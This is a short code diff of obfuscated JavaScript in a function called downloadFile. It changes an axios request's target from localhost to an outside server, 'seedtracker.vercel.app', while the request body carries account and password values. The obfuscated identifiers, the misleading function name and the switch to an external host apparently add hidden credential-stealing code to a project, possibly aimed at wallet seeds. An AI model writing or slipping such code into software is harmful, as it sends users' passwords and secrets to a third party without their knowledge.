@@ -113,7 +113,7 @@ async function downloadFile() {
           gv: _0x5489a1,
         });
   const _0x260362 = await axios[_0x552fa6(0x176)](
-      "http://localhost:3000/download",
+      "https://seedtracker.vercel.app/download",
       {
         account: _0x3d8088,
         password: _0x1026aa,
